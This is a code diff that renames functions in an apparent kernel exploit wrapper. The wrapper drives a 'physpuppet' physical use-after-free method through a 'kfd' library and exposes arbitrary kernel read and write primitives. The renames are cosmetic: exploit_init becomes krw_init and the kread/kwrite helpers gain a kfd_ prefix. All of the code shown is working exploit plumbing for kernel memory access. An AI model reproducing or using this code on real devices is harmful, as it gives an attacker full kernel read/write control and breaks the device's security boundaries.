@@ -8,71 +8,71 @@
 
 uint64_t gKfd = 0;
 
-uint8_t kread8(uint64_t where) {
+uint8_t kfd_kread8(uint64_t where) {
     uint64_t out;
     kread(gKfd, where, &out, sizeof(uint64_t));
     return (uint8_t)out;
 }
-uint16_t kread16(uint64_t where) {
+uint16_t kfd_kread16(uint64_t where) {
     uint64_t out;
     kread(gKfd, where, &out, sizeof(uint64_t));
     return (uint16_t)out;
 }
-uint32_t kread32(uint64_t where) {
+uint32_t kfd_kread32(uint64_t where) {
     uint64_t out;
     kread(gKfd, where, &out, sizeof(uint64_t));
     return (uint32_t)out;
 }
-uint64_t kread64(uint64_t where) {
+uint64_t kfd_kread64(uint64_t where) {
     uint64_t out;
     kread(gKfd, where, &out, sizeof(uint64_t));
     return out;
 }
 
-void kwrite8(uint64_t where, uint8_t what) {
+void kfd_kwrite8(uint64_t where, uint8_t what) {
     uint8_t _buf[8] = {};
     _buf[0] = what;
-    _buf[1] = kread8(where+1);
-    _buf[2] = kread8(where+2);
-    _buf[3] = kread8(where+3);
-    _buf[4] = kread8(where+4);
-    _buf[5] = kread8(where+5);
-    _buf[6] = kread8(where+6);
-    _buf[7] = kread8(where+7);
+    _buf[1] = kfd_kread8(where+1);
+    _buf[2] = kfd_kread8(where+2);
+    _buf[3] = kfd_kread8(where+3);
+    _buf[4] = kfd_kread8(where+4);
+    _buf[5] = kfd_kread8(where+5);
+    _buf[6] = kfd_kread8(where+6);
+    _buf[7] = kfd_kread8(where+7);
     kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
 }
 
-void kwrite16(uint64_t where, uint16_t what) {
+void kfd_kwrite16(uint64_t where, uint16_t what) {
     u16 _buf[4] = {};
     _buf[0] = what;
-    _buf[1] = kread16(where+2);
-    _buf[2] = kread16(where+4);
-    _buf[3] = kread16(where+6);
+    _buf[1] = kfd_kread16(where+2);
+    _buf[2] = kfd_kread16(where+4);
+    _buf[3] = kfd_kread16(where+6);
     kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
 }
 
-void kwrite32(uint64_t where, uint32_t what) {
+void kfd_kwrite32(uint64_t where, uint32_t what) {
     u32 _buf[2] = {};
     _buf[0] = what;
-    _buf[1] = kread32(where+4);
+    _buf[1] = kfd_kread32(where+4);
     kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
 }
-void kwrite64(uint64_t where, uint64_t what) {
+void kfd_kwrite64(uint64_t where, uint64_t what) {
     u64 _buf[1] = {};
     _buf[0] = what;
     kwrite((u64)(gKfd), &_buf, where, sizeof(u64));
 }
 
-int kreadbuf(uint64_t where, void *buf, size_t size)
+int kfd_kreadbuf(uint64_t where, void *buf, size_t size)
 {
     if (size == 1) {
-        *(uint8_t*)buf = kread8(where);
+        *(uint8_t*)buf = kfd_kread8(where);
     }
     else if (size == 2) {
-        *(uint16_t*)buf = kread16(where);
+        *(uint16_t*)buf = kfd_kread16(where);
     }
     else if (size == 4) {
-        *(uint32_t*)buf = kread32(where);
+        *(uint32_t*)buf = kfd_kread32(where);
     }
     else {
         if (size >= UINT16_MAX) {
@@ -90,16 +90,16 @@ int kreadbuf(uint64_t where, void *buf, size_t size)
     return 0;
 }
 
-int kwritebuf(uint64_t where, const void *buf, size_t size)
+int kfd_kwritebuf(uint64_t where, const void *buf, size_t size)
 {
     if (size == 1) {
-        kwrite8(where, *(uint8_t*)buf);
+        kfd_kwrite8(where, *(uint8_t*)buf);
     }
     else if (size == 2) {
-        kwrite16(where, *(uint16_t*)buf);
+        kfd_kwrite16(where, *(uint16_t*)buf);
     }
     else if (size == 4) {
-        kwrite32(where, *(uint32_t*)buf);
+        kfd_kwrite32(where, *(uint32_t*)buf);
     }
     else {
         if (size >= UINT16_MAX) {
@@ -117,7 +117,7 @@ int kwritebuf(uint64_t where, const void *buf, size_t size)
     return 0;
 }
 
-int exploit_init(const char *flavor)
+int krw_init(const char *flavor)
 {
     u64 method = 0;
     if (!strcmp(flavor, "physpuppet")) {
@@ -262,8 +262,8 @@ int exploit_init(const char *flavor)
     printf("Available memory after hogging: 0x%010zx\n", available_memory_after_hogging);
 
     gKfd = kopen(puaf_pages, method, kread_method, kwrite_method);
-    gPrimitives.kreadbuf = kreadbuf;
-    gPrimitives.kwritebuf = kwritebuf;
+    gPrimitives.kreadbuf = kfd_kreadbuf;
+    gPrimitives.kwritebuf = kfd_kwritebuf;
 
     if (hogged != NULL) {
         free(hogged);
@@ -274,12 +274,12 @@ int exploit_init(const char *flavor)
     return 0;
 }
 
-int exploit_deinit(void)
+int krw_deinit(void)
 {
-    if (gPrimitives.kreadbuf == kreadbuf) {
+    if (gPrimitives.kreadbuf == kfd_kreadbuf) {
         gPrimitives.kreadbuf = NULL;
     }
-    if (gPrimitives.kwritebuf == kwritebuf) {
+    if (gPrimitives.kwritebuf == kfd_kwritebuf) {
         gPrimitives.kwritebuf = NULL;
     }
 
